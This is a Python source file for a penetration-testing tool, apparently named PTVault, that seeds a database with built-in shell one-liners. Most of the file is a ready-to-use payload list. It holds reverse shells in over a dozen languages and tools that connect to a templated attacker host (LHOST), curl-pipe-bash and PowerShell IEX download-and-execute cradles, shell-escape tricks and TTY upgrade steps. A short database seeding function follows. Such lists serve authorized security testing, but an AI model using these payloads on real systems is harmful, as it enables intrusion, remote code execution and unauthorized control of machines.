"""Built-in shell one-liners: the Shells, Reverse Shells and Shell Upgrades
that ship with PTVault.

They are a permanent part of the app. Every start restores any built-in that is
missing and resets one whose content differs from this list, so a new release
can also correct a command. The API refuses to edit or delete a built-in;
users add their own one-liners alongside them.
"""

BUILTIN_SHELL_ONELINERS = [
    # ==================== SHELLS (spawn interactive shells) ====================
    {
        "category": "shells",
        "subcategory": "python",
        "name": "Python PTY Spawn",
        "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Spawn interactive bash shell using Python pty module",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "python",
        "name": "Python3 PTY Spawn",
        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Spawn interactive bash shell using Python3 pty module",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "perl",
        "name": "Perl Shell Spawn",
        "command": "perl -e 'exec \"/bin/bash\";'",
        "description": "Spawn bash shell using Perl",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "ruby",
        "name": "Ruby Shell Spawn",
        "command": "ruby -e 'exec \"/bin/bash\"'",
        "description": "Spawn bash shell using Ruby",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "lua",
        "name": "Lua Shell Spawn",
        "command": "lua -e 'os.execute(\"/bin/bash\")'",
        "description": "Spawn bash shell using Lua",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "awk",
        "name": "AWK Shell Spawn",
        "command": "awk 'BEGIN {system(\"/bin/bash\")}'",
        "description": "Spawn bash shell using AWK",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "find",
        "name": "Find Shell Spawn",
        "command": "find / -name test -exec /bin/bash \\;",
        "description": "Spawn bash shell using find command",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "vim",
        "name": "Vim Shell Escape",
        "command": "vim -c ':!/bin/bash'",
        "description": "Escape to bash from Vim",
        "variables": "[]"
    },
    {
        "category": "shells",
        "subcategory": "nmap",
        "name": "Nmap Interactive Shell",
        "command": "nmap --interactive\\n!sh",
        "description": "Spawn shell from Nmap interactive mode (older versions)",
        "variables": "[]"
    },

    # ==================== REVERSE SHELLS ====================
    # Bash
    {
        "category": "reverse_shells",
        "subcategory": "bash",
        "name": "Bash TCP",
        "command": "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        "description": "Bash reverse shell over TCP",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "bash",
        "name": "Bash TCP (Alternative)",
        "command": "exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}}; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "description": "Bash reverse shell using file descriptor",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "bash",
        "name": "Bash UDP",
        "command": "sh -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1",
        "description": "Bash reverse shell over UDP",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Python
    {
        "category": "reverse_shells",
        "subcategory": "python",
        "name": "Python Reverse Shell",
        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "python",
        "name": "Python3 Reverse Shell",
        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python3 reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "python",
        "name": "Python PTY Reverse Shell",
        "command": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "description": "Python reverse shell with PTY (better interactivity)",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Perl
    {
        "category": "reverse_shells",
        "subcategory": "perl",
        "name": "Perl Reverse Shell",
        "command": "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "description": "Perl reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "perl",
        "name": "Perl Reverse Shell (No sh)",
        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{{LHOST}}:{{LPORT}}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "description": "Perl reverse shell without /bin/sh",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # PHP
    {
        "category": "reverse_shells",
        "subcategory": "php",
        "name": "PHP Reverse Shell",
        "command": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "php",
        "name": "PHP Reverse Shell (proc_open)",
        "command": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "description": "PHP reverse shell using proc_open",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Ruby
    {
        "category": "reverse_shells",
        "subcategory": "ruby",
        "name": "Ruby Reverse Shell",
        "command": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "description": "Ruby reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "ruby",
        "name": "Ruby Reverse Shell (No sh)",
        "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{{LHOST}}\",{{LPORT}});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "description": "Ruby reverse shell without /bin/sh",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Netcat
    {
        "category": "reverse_shells",
        "subcategory": "netcat",
        "name": "Netcat Traditional",
        "command": "nc -e /bin/sh {{LHOST}} {{LPORT}}",
        "description": "Netcat reverse shell (requires -e option)",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "netcat",
        "name": "Netcat OpenBSD (mkfifo)",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f",
        "description": "Netcat reverse shell using named pipe (OpenBSD nc)",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "netcat",
        "name": "Netcat BusyBox",
        "command": "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f",
        "description": "Netcat reverse shell for BusyBox (mknod)",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Socat
    {
        "category": "reverse_shells",
        "subcategory": "socat",
        "name": "Socat Reverse Shell",
        "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}",
        "description": "Socat reverse shell with full TTY",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "socat",
        "name": "Socat Listener (for full TTY)",
        "command": "socat file:`tty`,raw,echo=0 TCP-L:{{LPORT}}",
        "description": "Socat listener for full TTY reverse shell",
        "variables": '[{"name": "LPORT", "default": "4444"}]'
    },

    # OpenSSL
    {
        "category": "reverse_shells",
        "subcategory": "openssl",
        "name": "OpenSSL Reverse Shell",
        "command": "mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{LHOST}}:{{LPORT}} > /tmp/s; rm /tmp/s",
        "description": "Encrypted reverse shell using OpenSSL",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "openssl",
        "name": "OpenSSL Listener",
        "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port {{LPORT}}",
        "description": "OpenSSL listener for encrypted reverse shell",
        "variables": '[{"name": "LPORT", "default": "4444"}]'
    },

    # PowerShell
    {
        "category": "reverse_shells",
        "subcategory": "powershell",
        "name": "PowerShell Reverse Shell",
        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "description": "PowerShell reverse shell for Windows",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "powershell",
        "name": "PowerShell Reverse Shell (Base64)",
        "command": "powershell -e {{BASE64_PAYLOAD}}",
        "description": "PowerShell reverse shell using Base64 encoded payload",
        "variables": '[{"name": "BASE64_PAYLOAD", "default": ""}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "powershell",
        "name": "PowerShell IEX Download Cradle",
        "command": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://{{LHOST}}/shell.ps1')\"",
        "description": "PowerShell download and execute reverse shell script",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
    },

    # Node.js
    {
        "category": "reverse_shells",
        "subcategory": "nodejs",
        "name": "Node.js Reverse Shell",
        "command": "require('child_process').exec('nc -e /bin/sh {{LHOST}} {{LPORT}}')",
        "description": "Node.js reverse shell using child_process",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "nodejs",
        "name": "Node.js Reverse Shell (Full)",
        "command": "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect({{LPORT}},'{{LHOST}}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();",
        "description": "Node.js reverse shell without nc dependency",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Java
    {
        "category": "reverse_shells",
        "subcategory": "java",
        "name": "Java Reverse Shell (Runtime)",
        "command": "Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done'\"); p.waitFor();",
        "description": "Java reverse shell using Runtime.exec()",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Lua
    {
        "category": "reverse_shells",
        "subcategory": "lua",
        "name": "Lua Reverse Shell",
        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{LHOST}}','{{LPORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "description": "Lua reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Golang
    {
        "category": "reverse_shells",
        "subcategory": "golang",
        "name": "Go Reverse Shell",
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{LHOST}}:{{LPORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "description": "Go reverse shell (compile and run)",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # AWK
    {
        "category": "reverse_shells",
        "subcategory": "awk",
        "name": "AWK Reverse Shell",
        "command": "awk 'BEGIN {s = \"/inet/tcp/0/{{LHOST}}/{{LPORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
        "description": "AWK reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },

    # Curl-based delivery
    {
        "category": "reverse_shells",
        "subcategory": "curl",
        "name": "Curl Bash Reverse Shell",
        "command": "curl http://{{LHOST}}/shell.sh | bash",
        "description": "Download and execute bash reverse shell script",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
    },
    {
        "category": "reverse_shells",
        "subcategory": "curl",
        "name": "Curl Python Reverse Shell",
        "command": "curl http://{{LHOST}}/shell.py | python",
        "description": "Download and execute Python reverse shell",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
    },

    # ==================== SHELL UPGRADES ====================
    {
        "category": "shell_upgrades",
        "subcategory": "python",
        "name": "Python PTY Upgrade",
        "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Upgrade to interactive PTY shell using Python",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "python",
        "name": "Python3 PTY Upgrade",
        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Upgrade to interactive PTY shell using Python3",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "script",
        "name": "Script TTY Upgrade",
        "command": "/usr/bin/script -qc /bin/bash /dev/null",
        "description": "Upgrade to TTY shell using script command",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "socat",
        "name": "Socat Full TTY",
        "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}",
        "description": "Full TTY reverse shell using socat",
        "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "shell_upgrades",
        "subcategory": "stty",
        "name": "Full TTY Upgrade (Background Method)",
        "command": "# In reverse shell:\\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\\n# Press Ctrl+Z to background\\n# In your terminal:\\nstty raw -echo; fg\\n# Press Enter twice\\nexport TERM=xterm-256color\\nexport SHELL=bash\\nstty rows 38 columns 116",
        "description": "Complete TTY upgrade with job control and proper terminal",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "stty",
        "name": "STTY Raw Mode",
        "command": "stty raw -echo; fg",
        "description": "Set terminal to raw mode after backgrounding shell (Ctrl+Z)",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "export",
        "name": "Export Terminal Variables",
        "command": "export TERM=xterm-256color; export SHELL=/bin/bash; export HOME=/root",
        "description": "Set environment variables for proper terminal behavior",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "stty",
        "name": "Set Terminal Size",
        "command": "stty rows {{ROWS}} columns {{COLS}}",
        "description": "Set terminal dimensions (match your local terminal)",
        "variables": '[{"name": "ROWS", "default": "38"}, {"name": "COLS", "default": "116"}]'
    },
    {
        "category": "shell_upgrades",
        "subcategory": "perl",
        "name": "Perl PTY Upgrade",
        "command": "perl -e 'exec \"/bin/bash\"'",
        "description": "Upgrade shell using Perl",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "expect",
        "name": "Expect Shell Upgrade",
        "command": "expect -c 'spawn /bin/bash; interact'",
        "description": "Upgrade to interactive shell using expect",
        "variables": "[]"
    },
    {
        "category": "shell_upgrades",
        "subcategory": "rlwrap",
        "name": "Rlwrap Listener (Arrow Keys)",
        "command": "rlwrap nc -lvnp {{LPORT}}",
        "description": "Netcat listener with readline support (arrow keys, history)",
        "variables": '[{"name": "LPORT", "default": "4444"}]'
    },
    {
        "category": "shell_upgrades",
        "subcategory": "reset",
        "name": "Reset Terminal",
        "command": "reset",
        "description": "Reset terminal after TTY upgrade",
        "variables": "[]"
    }
]


_FIELDS = ('subcategory', 'command', 'description', 'variables')


def seed_builtin_shell_oneliners(conn):
    """Insert missing built-ins and restore any that differ from the list.

    Built-ins are matched on (category, name). Returns (added, restored).
    """
    cursor = conn.cursor()
    cursor.execute(
        'SELECT id, category, name, subcategory, command, description, variables '
        'FROM shell_oneliners WHERE is_builtin = 1'
    )
    existing = {(row[1], row[2]): row for row in cursor.fetchall()}

    added = restored = 0
    for item in BUILTIN_SHELL_ONELINERS:
        values = tuple(item[f] for f in _FIELDS)
        row = existing.get((item['category'], item['name']))
        if row is None:
            cursor.execute(
                'INSERT INTO shell_oneliners (category, subcategory, name, command, '
                'description, variables, is_admin, is_builtin) VALUES (?, ?, ?, ?, ?, ?, 1, 1)',
                (item['category'], item['subcategory'], item['name'], item['command'],
                 item['description'], item['variables'])
            )
            added += 1
        elif tuple(row[3:]) != values:
            cursor.execute(
                'UPDATE shell_oneliners SET subcategory = ?, command = ?, description = ?, '
                'variables = ? WHERE id = ?',
                values + (row[0],)
            )
            restored += 1

    conn.commit()
    return added, restored
